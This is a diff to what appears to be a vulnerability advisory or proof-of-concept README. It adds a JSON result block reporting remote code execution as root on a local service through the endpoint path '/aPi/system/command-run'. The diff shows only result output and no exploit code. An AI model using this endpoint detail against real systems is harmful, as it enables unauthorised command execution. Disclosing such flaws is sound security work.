@@ -67,6 +67,20 @@ Result:
 [+] RCE success via /aPi/system/command-run
 root
 ```
+```json
+[
+  {
+    "target": "http://localhost:5700",
+    "reachable": true,
+    "version": "2.20.0",
+    "rce": {
+      "success": true,
+      "path": "/aPi/system/command-run",
+      "output": "root"
+    }
+  }
+]
+```
 
 ## Impact
 Successful exploitation can allow:
